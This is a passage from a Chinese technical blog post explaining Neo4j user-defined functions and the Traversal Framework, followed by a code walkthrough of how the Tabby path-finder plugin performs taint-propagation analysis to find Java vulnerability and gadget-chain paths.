org.neo4j.procedure.UserFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Join</span> </span>&#123;</span><br><span class="line">    <span class="meta">@UserFunction</span></span><br><span class="line">    <span class="meta">@Description(&quot;example.join([&#x27;s1&#x27;,&#x27;s2&#x27;,...], delimiter) - join the given strings with the given delimiter.&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">join</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="meta">@Name(&quot;strings&quot;)</span> List&lt;String&gt; strings,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="meta">@Name(value = &quot;delimiter&quot;, defaultValue = &quot;,&quot;)</span> String delimiter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strings == <span class="keyword">null</span> || delimiter == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> String.join(delimiter, strings);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Aggregation"><a href="#Aggregation" class="headerlink" title="Aggregation"></a>Aggregation</h5><p>聚合函数，UDAF(User- Defined Aggregation Funcation)，由多到一，类似SUM()/AVG().</p><ul><li>UserAggregationFunction</li><li>UserAggregationUpdate</li><li>UserAggregationResult</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.neo4j.procedure.UserAggregationFunction;</span><br><span class="line"><span class="keyword">import</span> org.neo4j.procedure.UserAggregationUpdate;</span><br><span class="line"><span class="keyword">import</span> org.neo4j.procedure.UserAggregationResult;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Last</span> </span>&#123;</span><br><span class="line">    <span class="meta">@UserAggregationFunction(&quot;example.last&quot;)</span></span><br><span class="line">    <span class="meta">@Description(&quot;example.last(value) - returns last non-null row&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LastFunction <span class="title">last</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LastFunction();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LastFunction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Object lastValue;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@UserAggregationUpdate</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">aggregate</span><span class="params">(<span class="meta">@Name(&quot;value&quot;)</span> Object value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.lastValue = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@UserAggregationResult</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">result</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> lastValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-1-2-Traversal-Framework"><a href="#4-1-2-Traversal-Framework" class="headerlink" title="4.1.2 Traversal Framework"></a>4.1.2 Traversal Framework</h4><h5 id="TraversalDescription"><a href="#TraversalDescription" class="headerlink" title="TraversalDescription"></a>TraversalDescription</h5><p>TraversalDescription 是用于定义和初始化遍历的主要接口。例如</p><p><strong>Traverser</strong><br>TraversalDescription.travserse()可以生成traverser对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td;</span><br><span class="line"><span class="keyword">try</span> ( Transaction tx = graphDb.beginTx() ) &#123;</span><br><span class="line">     td = tx.traversalDescription();</span><br><span class="line">&#125;</span><br><span class="line">Traverser traverser = td.traverse( startNode );</span><br><span class="line"><span class="keyword">for</span> ( Path path : traverser ) &#123;</span><br><span class="line">    <span class="comment">// Extend as needed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>relationships()方法</strong></p><p>relationships()方法是一个过滤器，符合的才会进入td.traverse。</p><blockquote><p>By default, all relationships are traversed, regardless of their type. However, if one or more relationships are added, then only the added types will be traversed. </p></blockquote><p>如果没有设定relationships()，那么不做过滤，如果有relationships()，那么只保留符合relationships()的关系。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td = transaction.traversalDescription()</span><br><span class="line">    .relationships(RelationshipType.withName(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">    .relationships(RelationshipType.withName(<span class="string">&quot;B&quot;</span>), Direction.OUTGOING);</span><br><span class="line"><span class="keyword">return</span> td.traverse(startNode);</span><br></pre></td></tr></table></figure><p><strong>Evaluators</strong></p><p>除relationships做筛选之外，还可以用Evaluators 做更复杂的功能过滤。relationships 是针对所有的Relationship，action是留或者不留，Evaluator针对一条Path，action 也更多。</p><p>针对一个Path，Evaluator 可以采取以下action：</p><ul><li>Evaluation.INCLUDE_AND_CONTINUE: 在结果中包含当前节点并继续遍历。</li><li>Evaluation.INCLUDE_AND_PRUNE：在结果中包含当前节点，但不继续遍历。</li><li>Evaluation.EXCLUDE_AND_CONTINUE: 从结果中排除当前节点，但继续遍历。</li><li>Evaluation.EXCLUDE_AND_PRUNE: 从结果中排除当前节点，不继续遍历。</li></ul><p>内置的Evaluator规则：</p><p><img src="/images/pasted-344.png" alt="upload successful"></p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td;</span><br><span class="line"><span class="keyword">try</span> ( Transaction tx = graphDb.beginTx() ) &#123;</span><br><span class="line">     td = tx.traversalDescription()</span><br><span class="line">            .evaluator(Evaluators.atDepth(<span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">td.traverse( startNode );</span><br></pre></td></tr></table></figure><p>atDepth(2) 表示仅遍历深度为2的节点。</p><p><strong>自定义Evaluator</strong></p><p>除了内置的Evaluator，也可以自定义Evaluator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LabelEvaluator</span> <span class="keyword">implements</span> <span class="title">Evaluator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Label label;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LabelEvaluator</span><span class="params">(Label label)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.label = label;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Evaluation <span class="title">evaluate</span><span class="params">(Path path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.endNode().hasLabel(label)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Evaluation.INCLUDE_AND_CONTINUE;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Evaluation.EXCLUDE_AND_CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td;</span><br><span class="line"><span class="keyword">try</span> ( Transaction tx = graphDb.beginTx() ) &#123;</span><br><span class="line">     td = tx.traversalDescription()</span><br><span class="line">            .evaluator(Evaluators.atDepth( <span class="number">2</span> ))</span><br><span class="line">            .evaluator(<span class="keyword">new</span> LabelEvaluator(Label.label(<span class="string">&quot;A&quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">td.traverse( startNode );</span><br></pre></td></tr></table></figure><p>以上定义了一个组合Evaluator（注意是and 关系）：</p><ol><li>路径长度为2</li><li>路径的结束节点有标签A属性</li></ol><p><strong>Uniqueness</strong></p><p>Uniqueness可以控制遍历的重复规则，默认值是NODE_GLOBAL：整个图中的任何节点都不能被多次访问，也就是不会有环的产生。</p><p><img src="/images/pasted-345.png" alt="upload successful"></p><p><strong>BranchOrderingPolicy和BranchSelector</strong></p><p>内置的深度优先、广度优先算法</p><p><img src="/images/pasted-346.png" alt="upload successful"></p><p>可以通过便捷方法breadthFirst()和depthFirst()快速设置搜索算法，分别对应广度优先和深度优先。这也相当于设置BranchOrderingPolicies.PREORDER_BREADTH_FIRST/BranchOrderingPolicies.PREORDER_DEPTH_FIRST策略。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">td = tx.traversalDescription()</span><br><span class="line">            .depthFirst();</span><br><span class="line">td = tx.traversalDescription()</span><br><span class="line">            .order(BranchOrderingPolicies.PREORDER_BREADTH_FIRST );</span><br></pre></td></tr></table></figure><p><strong>PathExpander</strong></p><p>PathExpander可以用于定义搜索的具体实现：在给定的Path上，找到想要的分支节点。</p><p>有多种指定 a 的方法PathExpander，例如：</p><ul><li>内置PathExpander定义了一些常用PathExpander的s。</li><li>PathExpanderBuilder允许组合定义。</li><li>PathExpander可以通过实现PathExpander接口来编写自定义。</li></ul><p><strong>内置的PathExpander</strong></p><p><img src="/images/pasted-347.png" alt="upload successful"></p><p>例如以下定义了搜索传播的规则：边类型为A，且为出方向</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td = transaction.traversalDescription()</span><br><span class="line">    .expand(PathExpanders.forTypeAndDirection( RelationshipType.withName( <span class="string">&quot;A&quot;</span> ), Direction.OUTGOING ));</span><br><span class="line">td.traverse( startNode );</span><br></pre></td></tr></table></figure><p><strong>PathExpanderBuilder</strong></p><p><img src="/images/pasted-348.png" alt="upload successful"></p><p>例如以下定义了搜索传播的规则：边类型为E1，其他都通过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td = transaction.traversalDescription()</span><br><span class="line">    .expand(PathExpanderBuilder.empty()</span><br><span class="line">                               .add(RelationshipType.withName(<span class="string">&quot;E1&quot;</span>))</span><br><span class="line">                               .build());</span><br><span class="line">td.traverse( startNode );</span><br></pre></td></tr></table></figure><p><strong>自定义PathExpander</strong></p><p>如下，定义了MaxWeightPathExpander，每增加一条边，那么该分支的属性值权重则加上该边的权重，如果权重超过最大值，那么就不继续。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaxWeightPathExpander</span> <span class="keyword">implements</span> <span class="title">PathExpander</span>&lt;<span class="title">Double</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">double</span> maxWeight;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MaxWeightPathExpander</span><span class="params">( <span class="keyword">double</span> maxWeight )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.maxWeight = maxWeight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterable&lt;Relationship&gt; <span class="title">expand</span><span class="params">( Path path, BranchState&lt;Double&gt; branchState )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.lastRelationship() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            branchState.setState( branchState.getState() + (<span class="keyword">double</span>) path.lastRelationship().getProperty( <span class="string">&quot;weight&quot;</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Iterable&lt;Relationship&gt; relationships = path.endNode().getRelationships( Direction.OUTGOING );</span><br><span class="line">        ArrayList&lt;Relationship&gt; filtered = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> ( Relationship relationship : relationships ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( branchState.getState() + (<span class="keyword">double</span>) relationship.getProperty( <span class="string">&quot;weight&quot;</span> ) &lt;= maxWeight ) &#123;</span><br><span class="line">                filtered.add(relationship);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> filtered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PathExpander <span class="title">reverse</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException( <span class="string">&quot;Not needed for the MonoDirectional Traversal Framework&quot;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TraversalDescription td &#x3D; transaction.traversalDescription()</span><br><span class="line">        .expand( new MaxWeightPathExpander(5.0), InitialBranchState.DOUBLE_ZERO );</span><br><span class="line">td.traverse( startNode );</span><br></pre></td></tr></table></figure><blockquote><p>** 疑问 **<br>expand 是何时触发的？</p></blockquote><p>从path.lastRelationship() 返回的是Relationship，可以猜测每次传播应该是以每一条边Relationship/Node 的增加为维度的。每当当前Branch有变化，则会触发expand。</p><h3 id="4-2-Tabby-Path-Finder的CallGraph程序间分析实现"><a href="#4-2-Tabby-Path-Finder的CallGraph程序间分析实现" class="headerlink" title="4.2 Tabby Path Finder的CallGraph程序间分析实现"></a>4.2 Tabby Path Finder的CallGraph程序间分析实现</h3><blockquote><p><strong>疑问</strong><br>wh1t3p1g师傅怎么找到TraversalPathFinder这个接口类的？官方文档没有，Github/Google居然也没搜到，难不成师傅是徇着TraversalDescription找到的？而且还需要打包成jar插件形式部署，是怎么测试的，想想好难呀 o(∩_∩)o</p></blockquote><p>整个调用关系如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PathFinding#allSimplePath</span><br><span class="line">  MonoDirectionalTraversalPathFinder#&lt;init&gt;(EvaluationContext,PathExpander,maxDepth,State,depthFirst,Judgment)</span><br><span class="line">  MonoDirectionalTraversalPathFinder#findAllPaths</span><br><span class="line">  ForwardedPathExpander#expand</span><br><span class="line">      CommonProcessor#init</span><br><span class="line">      CommonProcessor#process</span><br><span class="line">      ForwardedCalculator#v2</span><br><span class="line">      State.positions#put</span><br></pre></td></tr></table></figure><h4 id="4-2-1-接口"><a href="#4-2-1-接口" class="headerlink" title="4.2.1 接口"></a>4.2.1 接口</h4><table><thead><tr><th>接口</th><th>功能</th><th>备注</th></tr></thead><tbody><tr><td>allSimplePath</td><td>非污点传播，查找所有根据&lt;CALL&#124;ALIAS 能到的路径</td><td>backward analysis</td></tr><tr><td>allSimplePaths</td><td>非污点传播，查找所有根据&lt;CALL&#124;ALIAS 能到的路径</td><td>backward analysis</td></tr><tr><td>findJavaGadget</td><td>污点传播，会根据java原生反序列化的规则来查找利用链</td><td>forward analysis</td></tr><tr><td>findAllJavaGadget</td><td>污点传播,会根据java原生反序列化的规则来查找利用链</td><td>forward analysis</td></tr><tr><td>findVul</td><td>污点传播</td><td>forward analysis</td></tr><tr><td>findAllVul</td><td>污点传播</td><td>forward analysis</td></tr></tbody></table><p><strong>allSimplePath</strong></p><ul><li>sink</li><li>sources</li><li>maxNodes</li><li>state</li><li>depthFirst</li></ul><p><strong>allSimplePaths</strong></p><ul><li>sinks</li><li>sources</li><li>maxNodes</li><li>depthFirst</li></ul><p><strong>findJavaGadget</strong></p><ul><li>source</li><li>sinks</li><li>maxNodes</li><li>depthFirst</li></ul><p><strong>findAllJavaGadget</strong></p><ul><li>sources</li><li>sinks</li><li>maxNodes</li><li>depthFirst</li></ul><p><strong>findVul</strong></p><ul><li>sourceNode</li><li>sinkNodes</li><li>maxLength</li><li>depthFirst</li></ul><p><strong>findAllVul</strong></p><ul><li>sourceNode</li><li>sinkNodes</li><li>maxLength</li><li>depthFirst</li></ul><h4 id="4-2-2-实现跟踪"><a href="#4-2-2-实现跟踪" class="headerlink" title="4.2.2 实现跟踪"></a>4.2.2 实现跟踪</h4><p>以findVul 为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@Procedure</span><br><span class="line">@Description(&quot;tabby.algo.findVul(sourceNode, sinkNodes, maxLength, depthFirst) YIELD path, &quot; +</span><br><span class="line">        &quot;weight - run findVul from source node to sink nodes&quot;)</span><br><span class="line">public Stream&lt;PathResult&gt; findVul(</span><br><span class="line">        @Name(&quot;startNode&quot;) Node startNode,</span><br><span class="line">        @Name(&quot;endNodes&quot;) List&lt;Node&gt; endNodes,</span><br><span class="line">        @Name(&quot;maxLength&quot;) long maxLength,</span><br><span class="line">        @Name(&quot;depthFirst&quot;) boolean depthFirst) &#123;</span><br><span class="line"></span><br><span class="line">    MonoDirectionalTraversalPathFinder algo &#x3D; new MonoDirectionalTraversalPathFinder(</span><br><span class="line">            new BasicEvaluationContext(tx, db),</span><br><span class="line">            new ForwardedPathExpander(false, ProcessorFactory.newInstance(&quot;Common&quot;)),</span><br><span class="line">            (int) maxLength, getInitialState(Collections.singletonList(startNode)),</span><br><span class="line">            depthFirst, new CommonJudgment()</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    Iterable&lt;Path&gt; allPaths &#x3D; algo.findAllPaths(startNode, endNodes);</span><br><span class="line">    return StreamSupport.stream(allPaths.spliterator(), true)</span><br><span class="line">            .map(PathResult::new);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>MonoDirectionalTraversalPathFinder 自定义PathFinder</li><li>ForwardedPathExpander 指定正向分析</li><li>指定CommonProcessor</li></ul><h5 id="MonoDirectionalTraversalPathFinder"><a href="#MonoDirectionalTraversalPathFinder" class="headerlink" title="MonoDirectionalTraversalPathFinder"></a>MonoDirectionalTraversalPathFinder</h5><p>MonoDirectionalTraversalPathFinder -&gt; BasePathFinder -&gt; TraversalPathFinder</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">MonoDirectionalTraversalPathFinder</span><span class="params">(EvaluationContext context,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          PathExpander&lt;State&gt; expander,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          <span class="keyword">int</span> maxDepth,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          State state,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          <span class="keyword">boolean</span> depthFirst,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          Judgment judgment</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(context, expander, maxDepth, depthFirst);</span><br><span class="line">    <span class="keyword">this</span>.judgment = judgment;</span><br><span class="line">    <span class="keyword">this</span>.stack = <span class="keyword">new</span> InitialBranchState.State&lt;&gt;(state, state.copy());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Expander"><a href="#Expander" class="headerlink" title="Expander"></a>Expander</h5><p>重点的逻辑在Expander中，控制了如何从起点进行传播</p><p><strong>ForwardedPathExpander</strong></p><p>具体代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">ForwardedPathExpander</span><span class="params">(<span class="keyword">boolean</span> parallel, Processor processor)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>.processor = processor;</span><br><span class="line">       String[] types = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;CALL&gt;&quot;</span>, <span class="string">&quot;ALIAS&gt;&quot;</span>&#125;;</span><br><span class="line">...</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Iterable&lt;Relationship&gt; <span class="title">expand</span><span class="params">(Path path, BranchState&lt;State&gt; state)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> Node node = path.endNode();</span><br><span class="line">       <span class="keyword">final</span> Relationship lastRelationship = path.lastRelationship();</span><br><span class="line">       processor.init(node, state.getState(), lastRelationship, calculator);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(processor.isNeedProcess())&#123;</span><br><span class="line">           Iterable&lt;Relationship&gt; relationships = node.getRelationships(direction, getRelationshipTypes(lastRelationship, state.getState()));</span><br><span class="line">           List&lt;Relationship&gt; nextRelationships = StreamSupport.stream(relationships.spliterator(), parallel)</span><br><span class="line">                   .map((next) -&gt; processor.process(next))</span><br><span class="line">                   .filter(Objects::nonNull)</span><br><span class="line">                   .collect(Collectors.toList());</span><br><span class="line">           state.setState(processor.getNextState());</span><br><span class="line">           <span class="keyword">return</span> nextRelationships;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>初始化</p><ol><li>定义传播方向direction:&gt; or &lt;</li><li>定义传播关系relationshipTypes: CALL 和 ALIAS</li></ol><p>expand重点逻辑都在processor中，逻辑很简单</p><ol><li>processor.isNeedProcess()判断是否继续传播</li><li>如果ok，把endNode.getRelationships 加入，更新BranchState信息</li><li>processor.process(Relationship next)，更新待加入节点的上下文信息</li></ol><p>为了更好的记录当前Branch 上下文信息，Tabby引入了Processer类</p><p><strong>BaseProcessor</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Branch 当前endNode</span></span><br><span class="line">   <span class="keyword">public</span> Node node = <span class="keyword">null</span>;</span><br><span class="line">   <span class="comment">// 上一个State</span></span><br><span class="line">   <span class="keyword">public</span> State preState = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">// 下一个State</span></span><br><span class="line"><span class="keyword">public</span> State nextState = <span class="keyword">null</span>;</span><br><span class="line">   <span class="comment">// Branch 当前lastRelationship</span></span><br><span class="line">   <span class="keyword">public</span> Relationship lastRelationship = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">public</span> Calculator calculator = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">public</span> Set&lt;Integer&gt; polluted = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Relationship <span class="title">process</span><span class="params">(Relationship next)</span> </span>&#123;</span><br><span class="line">        Relationship ret = <span class="keyword">null</span>;</span><br><span class="line">        String nextId = next.getId() + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 如果是ALIAS关系</span></span><br><span class="line">        <span class="keyword">if</span>(Types.isAlias(next))&#123;</span><br><span class="line">            <span class="comment">// nextState.positions.put</span></span><br><span class="line">            <span class="comment">// 增加一条边的污点信息，沿用上一个节点的</span></span><br><span class="line">            nextState.put(nextId, polluted.stream().mapToInt(Integer::intValue).toArray());</span><br><span class="line">            <span class="comment">// alias 增加一条ALIAS</span></span><br><span class="line">            nextState.addAliasEdge(next.getId());</span><br><span class="line">            ret = next;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 如果为CALL</span></span><br><span class="line">        <span class="comment">// 获取 污点信息</span></span><br><span class="line">            String pollutedStr = (String) next.getProperty(<span class="string">&quot;POLLUTED_POSITION&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(pollutedStr == <span class="keyword">null</span>) <span class="keyword">return</span> ret;</span><br><span class="line">            <span class="comment">// 解析污点映射关系，例如0-&gt;1,0-&gt;0</span></span><br><span class="line">            <span class="keyword">int</span>[][] callSite = JsonHelper.parse(pollutedStr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            // 为了处理当前设计的代码属性图的缺点，但测试后发现丢失的情况很多，暂不处理</span></span><br><span class="line"><span class="comment">//            if((!isAbstract || !isFromAbstractClass) &amp;&amp; !PositionHelper.isCallerPolluted(callSite, polluted))&#123; // 如果当前调用边的调用者不可控，则下一次不进行alias操作</span></span><br><span class="line"><span class="comment">//                nextState.getNextAlias().add(next.getId());</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span>[] nextPos = calculator.calculate(callSite, polluted);</span><br><span class="line">            